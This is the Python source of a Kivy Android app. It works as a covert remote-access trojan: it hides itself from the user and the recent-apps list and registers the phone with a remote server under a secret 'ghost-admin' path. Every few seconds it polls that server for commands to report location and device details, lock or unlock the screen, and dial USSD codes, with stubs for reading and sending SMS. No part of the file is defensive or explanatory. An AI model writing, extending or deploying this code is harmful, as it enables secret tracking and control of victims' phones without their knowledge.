import kivy
kivy.require('2.1.0')

from kivy.app import App
from kivy.uix.widget import Widget
from kivy.utils import platform
from kivy.logger import Logger

import threading
import time
import json
import urllib.request
import urllib.parse
import subprocess
import os
import re
import sys
import hashlib
import uuid
from datetime import datetime

SERVER_URL = "https://GRY.pythonanywhere.com"
SECRET_PATH = "ghost-admin-2026"
poll_interval = 3

class RemoteControlService(threading.Thread):
    def __init__(self):
        super().__init__()
        self.daemon = True
        self.running = True
        self.device_id = None
        self.token = None
        
    def run(self):
        Logger.info('RC: Service started')
        self.device_id = self.get_device_id()
        self.auto_register()
        self.start_polling()
        while self.running:
            time.sleep(1)
    
    def get_device_id(self):
        try:
            with open('/sdcard/.rc_device_id', 'r') as f:
                return f.read().strip()
        except:
            pass
        device_id = f"PHONE_{uuid.uuid4().hex[:8].upper()}"
        try:
            with open('/sdcard/.rc_device_id', 'w') as f:
                f.write(device_id)
        except:
            pass
        return device_id
    
    def auto_register(self):
        try:
            device_info = self.get_device_info()
            data = json.dumps({
                "device_id": self.device_id,
                "device_name": device_info.get('model', 'My Phone'),
                "model": device_info.get('model', 'Unknown'),
                "manufacturer": device_info.get('manufacturer', 'Unknown'),
                "android_version": device_info.get('android_version', 'Unknown'),
                "fingerprint": self.generate_fingerprint(),
                "ram": device_info.get('ram', 'Unknown'),
                "storage": device_info.get('storage', 'Unknown'),
                "processor": device_info.get('processor', 'Unknown'),
                "screen_resolution": device_info.get('screen_resolution', 'Unknown')
            }).encode('utf-8')
            
            url = f"{SERVER_URL}/{SECRET_PATH}/api/register_apk"
            req = urllib.request.Request(url, data=data, method='POST')
            req.add_header('Content-Type', 'application/json')
            
            with urllib.request.urlopen(req, timeout=10) as response:
                result = json.loads(response.read().decode('utf-8'))
                self.token = result.get('token')
                if self.token:
                    Logger.info(f'RC: Registered: {self.device_id}')
                    self.send_device_info()
                    self.get_location()
        except Exception as e:
            Logger.error(f'RC: Registration error: {e}')
            threading.Timer(10, self.auto_register).start()
    
    def get_device_info(self):
        info = {}
        if platform == 'android':
            try:
                model = subprocess.run(['getprop', 'ro.product.model'], 
                                      capture_output=True, text=True).stdout.strip()
                info['model'] = model or 'Unknown'
                manufacturer = subprocess.run(['getprop', 'ro.product.manufacturer'], 
                                            capture_output=True, text=True).stdout.strip()
                info['manufacturer'] = manufacturer or 'Unknown'
                version = subprocess.run(['getprop', 'ro.build.version.release'], 
                                       capture_output=True, text=True).stdout.strip()
                info['android_version'] = version or 'Unknown'
                meminfo = subprocess.run(['cat', '/proc/meminfo'], 
                                       capture_output=True, text=True).stdout
                for line in meminfo.split('\n'):
                    if 'MemTotal' in line:
                        parts = line.split()
                        if len(parts) > 1:
                            info['ram'] = f"{int(parts[1]) // 1024 // 1024} GB"
                        break
                storage = subprocess.run(['df', '/data'], 
                                       capture_output=True, text=True).stdout
                lines = storage.split('\n')
                if len(lines) > 1:
                    parts = lines[1].split()
                    if len(parts) > 1:
                        info['storage'] = parts[1]
                screen = subprocess.run(['wm', 'size'], 
                                      capture_output=True, text=True).stdout
                if ':' in screen:
                    info['screen_resolution'] = screen.split(':')[1].strip()
                cpuinfo = subprocess.run(['cat', '/proc/cpuinfo'], 
                                      capture_output=True, text=True).stdout
                for line in cpuinfo.split('\n'):
                    if 'Hardware' in line:
                        parts = line.split(':')
                        if len(parts) > 1:
                            info['processor'] = parts[1].strip()
                            break
            except Exception as e:
                Logger.error(f'RC: Error getting device info: {e}')
        return info
    
    def generate_fingerprint(self):
        info = self.get_device_info()
        fingerprint_string = (
            f"{info.get('model', '')}|"
            f"{info.get('manufacturer', '')}|"
            f"{info.get('android_version', '')}|"
            f"{self.device_id}"
        )
        return f"FP_{hashlib.md5(fingerprint_string.encode()).hexdigest()[:12].upper()}"
    
    def send_device_info(self):
        info = self.get_device_info()
        self.send_command_result('status', info)
    
    def start_polling(self):
        def poll():
            if self.running:
                self.poll_commands()
                threading.Timer(poll_interval, poll).start()
        threading.Timer(5, poll).start()
    
    def poll_commands(self):
        if not self.token:
            return
        try:
            url = f"{SERVER_URL}/{SECRET_PATH}/api/poll_web/{self.device_id}"
            req = urllib.request.Request(url)
            req.add_header('X-Device-Token', self.token)
            with urllib.request.urlopen(req, timeout=10) as response:
                data = json.loads(response.read().decode('utf-8'))
                commands = data.get('commands', [])
                for cmd in commands:
                    self.execute_command(cmd)
        except Exception as e:
            Logger.error(f'RC: Poll error: {e}')
    
    def execute_command(self, cmd):
        command = cmd.get('command')
        data = cmd.get('data', '')
        cmd_id = cmd.get('id')
        Logger.info(f'RC: Executing: {command}')
        result = None
        if command == 'lock':
            result = self.lock_device()
        elif command == 'unlock':
            result = self.unlock_device()
        elif command == 'location':
            result = self.get_location()
        elif command == 'fingerprint':
            result = self.generate_fingerprint()
        elif command == 'status':
            result = self.get_device_info()
        elif command == 'ussd':
            result = self.execute_ussd(data)
        elif command == 'sms':
            result = self.read_sms()
        elif command == 'send_sms':
            result = self.send_sms(data)
        elif command == 'vibrate':
            result = self.vibrate_device()
        if result:
            self.send_command_result(command, result)
        self.mark_executed(cmd_id)
    
    def lock_device(self):
        if platform == 'android':
            try:
                subprocess.run(['input', 'keyevent', 'KEYCODE_POWER'], capture_output=True)
                return {'status': 'locked'}
            except:
                pass
        return {'status': 'failed'}
    
    def unlock_device(self):
        if platform == 'android':
            try:
                subprocess.run(['input', 'keyevent', 'KEYCODE_WAKEUP'], capture_output=True)
                subprocess.run(['input', 'swipe', '300', '1000', '300', '300'], capture_output=True)
                return {'status': 'unlocked'}
            except:
                pass
        return {'status': 'failed'}
    
    def get_location(self):
        if platform == 'android':
            try:
                result = subprocess.run(['dumpsys', 'location'], capture_output=True, text=True)
                output = result.stdout
                import re
                lat_match = re.search(r'latitude=([\d.]+)', output)
                lng_match = re.search(r'longitude=([\d.]+)', output)
                if lat_match and lng_match:
                    return {
                        'lat': float(lat_match.group(1)),
                        'lng': float(lng_match.group(1)),
                        'accuracy': 100
                    }
            except:
                pass
        return {'error': 'Location not available'}
    
    def execute_ussd(self, code):
        if platform == 'android':
            try:
                subprocess.run(['am', 'start', '-a', 'android.intent.action.CALL',
                              '-d', f'tel:{code}'], capture_output=True)
                return {'response': 'USSD sent'}
            except:
                pass
        return {'response': 'Failed'}
    
    def read_sms(self):
        return {'messages': []}
    
    def send_sms(self, data):
        return {'status': 'failed'}
    
    def vibrate_device(self):
        return {'status': 'vibrated'}
    
    def send_command_result(self, command, result):
        try:
            data = json.dumps({
                'device_id': self.device_id,
                'command': command,
                'result': result
            }).encode('utf-8')
            url = f"{SERVER_URL}/{SECRET_PATH}/api/command_result"
            req = urllib.request.Request(url, data=data, method='POST')
            req.add_header('Content-Type', 'application/json')
            urllib.request.urlopen(req, timeout=10)
        except Exception as e:
            Logger.error(f'RC: Error sending result: {e}')
    
    def mark_executed(self, cmd_id):
        if not cmd_id:
            return
        try:
            data = json.dumps({
                'command': {'id': cmd_id}
            }).encode('utf-8')
            url = f"{SERVER_URL}/{SECRET_PATH}/api/execute_web"
            req = urllib.request.Request(url, data=data, method='POST')
            req.add_header('Content-Type', 'application/json')
            urllib.request.urlopen(req, timeout=10)
        except:
            pass
    
    def stop(self):
        self.running = False

class RemoteControlApp(App):
    def build(self):
        self.hide_app()
        self.service = RemoteControlService()
        self.service.start()
        return Widget()
    
    def hide_app(self):
        if platform == 'android':
            try:
                from jnius import autoclass
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                activity = PythonActivity.mActivity
                activity.setExcludeFromRecents(True)
                activity.moveTaskToBack(True)
            except Exception as e:
                Logger.error(f'RC: Hide error: {e}')
    
    def on_pause(self):
        return True
    
    def on_resume(self):
        if platform == 'android':
            try:
                import android
                android.moveTaskToBack(True)
            except:
                pass

if __name__ == '__main__':
    RemoteControlApp().run()
